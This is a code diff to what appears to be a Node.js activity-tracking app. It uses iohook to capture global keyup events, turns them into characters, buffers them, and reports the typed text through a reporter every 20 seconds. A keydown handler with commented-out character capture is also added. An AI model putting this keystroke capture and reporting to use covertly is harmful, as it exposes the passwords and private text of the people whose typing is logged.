@@ -36,7 +36,7 @@ function reportInputAsSequencialString(){
     if(queuedInput && queuedInput!==''){
         reporter.report('key-input-event',JSON.stringify({'content':queuedInput}));
         console.log('Key-input-event: '+queuedInput);
-        queuedInput = ''
+        queuedInput = '';
     }
 }
 var onReportInputAsSequencialString = debounce(reportInputAsSequencialString,20*1000);
@@ -52,9 +52,23 @@ ioHook.on("mousemove", event => {
     //console.log(event);
     updateActivity()
 });
-
-ioHook.on("keyup", event => {
+ioHook.on("keydown", event => {
+    /*
+     * keycode is 0 at most time during keydown.
+     * So meanless at the time.
     console.log(event);
+    if(event && event.keycode){
+        var inputChar = keycode(event.keycode,true);
+        console.log(inputChar);
+        if(inputChar){
+            queuedInput+=inputChar;
+        }
+        onReportInputAsSequencialString();
+    }*/
+    updateActivity()
+});
+ioHook.on("keyup", event => {
+    //console.log(event);
     if(event && event.keycode){
         var inputChar = keycode(event.keycode,true);
         console.log(inputChar);
